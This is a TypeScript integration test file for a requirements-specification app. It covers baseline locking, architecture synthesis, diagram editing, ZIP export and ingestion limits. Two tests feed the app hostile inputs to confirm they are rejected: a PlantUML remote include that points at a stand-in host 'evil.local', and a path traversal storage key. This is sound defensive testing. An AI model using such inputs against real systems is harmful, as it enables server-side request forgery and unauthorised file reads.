import { describe, it, expect, beforeEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { unzipSync, strFromU8 } from 'fflate';
import { ConfigService } from '@nestjs/config';
import { DatabaseService } from '../db/database.service';
import { LocalStorageAdapter } from '../ports/storage.adapter';
import { StorageController } from '../ports/storage.controller';
import { PlantUMLRenderAdapter } from '../ports/render.adapter';
import { UsageService } from '../modules/usage/usage.service';
import { SseService } from '../modules/projects/sse.service';
import { ProjectsService } from '../modules/projects/projects.service';
import { RequirementsService } from '../modules/requirements/requirements.service';
import { ArchitectureService } from '../modules/architecture/architecture.service';
import { DiagramsService } from '../modules/diagrams/diagrams.service';
import { AgentService } from '../modules/agent/agent.service';
import { ExportsService } from '../modules/exports/exports.service';
import { IngestionService } from '../modules/ingestion/ingestion.service';

describe('Phase 1 End-to-End Domain Integration', () => {
  let tmpUploadDir: string;
  let dbService: DatabaseService;
  let storage: LocalStorageAdapter;
  let storageController: StorageController;
  let renderAdapter: PlantUMLRenderAdapter;
  let usageService: UsageService;
  let projectsService: ProjectsService;
  let reqService: RequirementsService;
  let archService: ArchitectureService;
  let diagramsService: DiagramsService;
  let agentService: AgentService;
  let exportsService: ExportsService;
  let ingestionService: IngestionService;

  const mockQueue = {
    enqueue: async () => 'mock-job-id',
    getJobStatus: async () => ({ status: 'completed', progress: 100 }),
  };

  beforeEach(() => {
    tmpUploadDir = fs.mkdtempSync(path.join(os.tmpdir(), 'srs-p1-test-'));
    const config = new ConfigService({
      UPLOAD_DIR: tmpUploadDir,
      PLANTUML_URL: 'http://127.0.0.1:1', // Force offline deterministic C4 SVG renderer
    });
    dbService = new DatabaseService(config);
    storage = new LocalStorageAdapter(config);
    storageController = new StorageController(storage);
    renderAdapter = new PlantUMLRenderAdapter(config);
    usageService = new UsageService(dbService);
    const sseService = new SseService();
    projectsService = new ProjectsService(dbService, mockQueue as any, usageService, sseService);
    reqService = new RequirementsService(dbService, mockQueue as any);
    archService = new ArchitectureService(dbService, mockQueue as any);
    diagramsService = new DiagramsService(dbService, archService, renderAdapter);
    agentService = new AgentService(dbService, archService, usageService, renderAdapter);
    exportsService = new ExportsService(
      dbService,
      archService,
      diagramsService,
      projectsService,
      storage,
      mockQueue as any,
    );
    ingestionService = new IngestionService(dbService, storage);
  });

  it('enforces baseline lock gates (uncovered segments & unconfirmed inferred requirements)', async () => {
    const proj = await projectsService.create({
      name: 'Smart Warehouse',
      platforms: ['web', 'iot'],
      output_language: 'vi',
    });

    dbService.memSegments.set('seg-unmapped', {
      id: 'seg-unmapped',
      projectId: proj.id,
      coverageStatus: 'unmapped',
      text: 'Cảm biến nhiệt độ gửi dữ liệu mỗi 30 giây.',
    });

    // Gate 1: unmapped segment blocks baseline lock
    await expect(projectsService.lockBaseline(proj.id)).rejects.toThrow('unmapped');

    // Map segment and add an unconfirmed inferred requirement
    dbService.memSegments.set('seg-unmapped', {
      id: 'seg-unmapped',
      projectId: proj.id,
      coverageStatus: 'mapped',
      text: 'Cảm biến nhiệt độ gửi dữ liệu mỗi 30 giây.',
    });
    const inferredReq = await reqService.create(proj.id, {
      type: 'non-functional',
      platforms: ['iot'],
      ears_pattern: 'ubiquitous',
      statement: 'Hệ thống phải lưu đệm dữ liệu tối thiểu 30 phút khi mất kết nối.',
      origin: 'inferred',
      source_segment_ids: ['seg-unmapped'],
    });

    // Gate 2: unconfirmed inferred requirement blocks baseline lock (FR-REQ-008)
    await expect(projectsService.lockBaseline(proj.id)).rejects.toThrow('FR-REQ-008');
    await expect(
      reqService.update(proj.id, inferredReq.id, { status: 'approved' }),
    ).rejects.toThrow('confirm_inferred');

    // Confirm inferred requirement -> baseline lock succeeds!
    await reqService.update(proj.id, inferredReq.id, { status: 'approved', confirm_inferred: true });
    const locked = await projectsService.lockBaseline(proj.id);
    expect(locked.status).toBe('baseline_locked');
    expect(locked.locked_requirements).toBe(1);
  });

  it('handles clarification skip as origin=assumption and answer with documentId=null segment', async () => {
    const proj = await projectsService.create({ name: 'Clarification Flow', platforms: ['web'] });
    const req = await reqService.create(proj.id, {
      type: 'non-functional',
      platforms: ['web'],
      ears_pattern: 'ubiquitous',
      statement: 'Hệ thống phải phản hồi nhanh.',
    });

    const issId = '11111111-1111-4111-8111-111111111111';
    const qId = '22222222-2222-4222-8222-222222222222';
    dbService.memIssues.set(issId, {
      id: issId,
      projectId: proj.id,
      requirementId: req.id,
      kind: 'vague',
      ruleId: 'INCOSE-001',
      severity: 'error',
      status: 'open',
    });
    dbService.memQuestions.set(qId, {
      id: qId,
      projectId: proj.id,
      issueId: issId,
      ruleId: 'INCOSE-001',
      text: 'Thời gian phản hồi tối đa là bao nhiêu?',
      status: 'pending',
    });

    const skipRes = await reqService.answerQuestion(qId, '', true);
    expect(skipRes.status).toBe('skipped');
    const updatedAfterSkip = await reqService.findOne(proj.id, req.id);
    expect(updatedAfterSkip.origin).toBe('assumption');
  });

  it('synthesizes YAML-driven architecture, blocks unsafe !include, preserves detached diagrams, and charges 0 LLM tokens for Tier-0 agent', async () => {
    const proj = await projectsService.create({
      name: 'IoT Fleet Portal',
      platforms: ['web', 'mobile', 'iot'],
      output_language: 'vi',
    });

    await reqService.create(proj.id, {
      type: 'non-functional',
      platforms: ['web', 'iot'],
      ears_pattern: 'event-driven',
      statement: 'Khi nhận bản tin MQTT, hệ thống phải xử lý bất đồng bộ qua message queue trong 500ms.',
      is_asr: true,
    });

    const model = await archService.synthesizeArchitecture(proj.id);
    expect(model.elements.some((e) => e.id === 'target_system' && e.kind === 'system')).toBe(true);
    expect(model.elements.some((e) => e.id === 'mobile_app')).toBe(true);
    expect(model.elements.some((e) => e.id === 'mqtt_broker')).toBe(true);
    expect(model.elements.some((e) => e.id === 'message_queue')).toBe(true); // From tactics-catalog.yaml `rel-queue`
    expect(model.tech_choices.length).toBeGreaterThanOrEqual(5);

    const diags = await diagramsService.listDiagrams(model.id);
    expect(diags).toHaveLength(3);
    const containerDiag = diags.find((d) => d.type === 'container')!;

    // Block unsafe SSRF / local file !include (NFR-SEC-004)
    await expect(
      diagramsService.updatePuml(containerDiag.id, '@startuml\n!include http://evil.local/pwn.puml\n@enduml'),
    ).rejects.toThrow('Unsafe !include');

    // Valid stdlib C4 include switches to detached mode and survives model patches
    const customPuml = '@startuml\n!include <C4/C4_Container>\ntitle Custom Detached Container\nPerson(u, "Admin")\n@enduml';
    const detached = await diagramsService.updatePuml(containerDiag.id, customPuml);
    expect(detached.mode).toBe('detached');
    expect(detached.svg).toContain('Custom Detached Container');

    // Agent proposes patch at 0 LLM token cost without mutating live model until accepted
    const session = await agentService.createSession(proj.id, 'user-agent-test');
    const draft = await agentService.sendMessage(session.id, 'Hãy thêm CDN cho tài nguyên tĩnh', 'user-agent-test');
    expect(draft.token_cost).toBe(0);
    expect(draft.operations_count).toBeGreaterThan(0);

    const usageAfterAgent = await usageService.getCurrentUsage('user-agent-test');
    expect(usageAfterAgent.usedTokens).toBe(0);

    await agentService.acceptPatch(draft.patch_id);
    const modelV2 = await archService.findOne(model.id);
    expect(modelV2.version).toBe(2);

    // Detached container diagram must STILL keep customPuml while context diagram updated
    const reloadedContainer = await diagramsService.getDiagram(containerDiag.id, 'puml');
    expect(reloadedContainer.mode).toBe('detached');
    expect(reloadedContainer.puml).toBe(customPuml);
  });

  it('packages real ZIP export and serves/guards downloads via StorageController', async () => {
    const proj = await projectsService.create({
      name: 'Bilingual Export Project',
      platforms: ['web'],
      output_language: 'vi',
    });
    await reqService.addGlossaryTerm(proj.id, {
      term_vi: 'Sổ độ phủ',
      term_en: 'Coverage Ledger',
      definition: 'Cơ chế đảm bảo 100% đoạn nguồn được đối chiếu.',
    });
    await reqService.create(proj.id, {
      code: 'FR-001',
      type: 'functional',
      platforms: ['web'],
      ears_pattern: 'event-driven',
      statement: 'Khi người dùng nhấn Xuất hồ sơ, hệ thống phải tạo tệp nén ZIP.',
      acceptance_criteria: 'Given dự án hợp lệ\nWhen nhấn Xuất\nThen tải về tệp ZIP',
    });
    await archService.synthesizeArchitecture(proj.id);

    const exp = await exportsService.createExport(proj.id, ['markdown', 'csv', 'puml', 'svg', 'zip']);
    expect(exp.status).toBe('ready');
    expect(exp.download_url).toContain('/api/v1/storage/files/');

    // Extract key and expires query from download_url
    const parsedUrl = new URL(`http://localhost${exp.download_url}`);
    const key = decodeURIComponent(parsedUrl.pathname.split('/').pop()!);
    const expires = parsedUrl.searchParams.get('expires')!;

    let capturedHeaders: Record<string, string> = {};
    let capturedBody: Buffer | null = null;
    const mockRes = {
      header: (k: string, v: string) => {
        capturedHeaders[k] = v;
      },
      send: (b: Buffer) => {
        capturedBody = b;
        return b;
      },
    };

    await storageController.downloadFile(key, expires, mockRes);
    expect(capturedHeaders['Content-Type']).toBe('application/zip');
    expect(capturedBody).toBeInstanceOf(Buffer);

    const unzipped = unzipSync(new Uint8Array(capturedBody!));
    expect(Object.keys(unzipped)).toContain('SRS-Specification.md');
    expect(Object.keys(unzipped)).toContain('Requirements-Traceability.csv');
    expect(Object.keys(unzipped)).toContain('diagrams/context.puml');
    expect(Object.keys(unzipped)).toContain('diagrams/container.svg');

    const mdText = strFromU8(unzipped['SRS-Specification.md']!);
    expect(mdText).toContain('Bilingual Export Project');
    expect(mdText).toContain('Coverage Ledger');

    const csvBytes = unzipped['Requirements-Traceability.csv']!;
    expect(Array.from(csvBytes.slice(0, 3))).toEqual([0xef, 0xbb, 0xbf]); // UTF-8 BOM bytes for Excel
    const csvText = strFromU8(csvBytes);
    expect(csvText).toContain('FR-001');

    // Expired URL must throw 410 Gone
    await expect(storageController.downloadFile(key, '1000', mockRes)).rejects.toThrow('expired');

    // Path traversal must throw 400 Bad Request
    await expect(storageController.downloadFile('..%2Fsecret.txt', undefined, mockRes)).rejects.toThrow(
      'Invalid storage key',
    );
  });

  it('rejects scanned/empty PDFs with 422 UnprocessableEntityException (FR-ING-008) and enforces 10-doc limit', async () => {
    const proj = await projectsService.create({ name: 'Ingestion Guard Test', platforms: ['web'] });

    // Minimal valid 1-page blank PDF (0 text characters -> ScannedPdfError -> 422)
    const minimalBlankPdf = Buffer.from(
      `%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000052 00000 n \n0000000101 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n164\n%%EOF`,
      'utf-8',
    );

    await expect(
      ingestionService.ingestFile(proj.id, {
        buffer: minimalBlankPdf,
        filename: 'scanned-image.pdf',
        mimeType: 'application/pdf',
      }),
    ).rejects.toThrow(/PDF/);

    for (let i = 0; i < 10; i++) {
      await ingestionService.ingestText(proj.id, { text: `Yêu cầu số ${i + 1}: Hệ thống phải lưu log.` });
    }
    await expect(
      ingestionService.ingestText(proj.id, { text: 'Tài liệu thứ 11 vượt giới hạn' }),
    ).rejects.toThrow('maximum of 10 documents');
  });
});
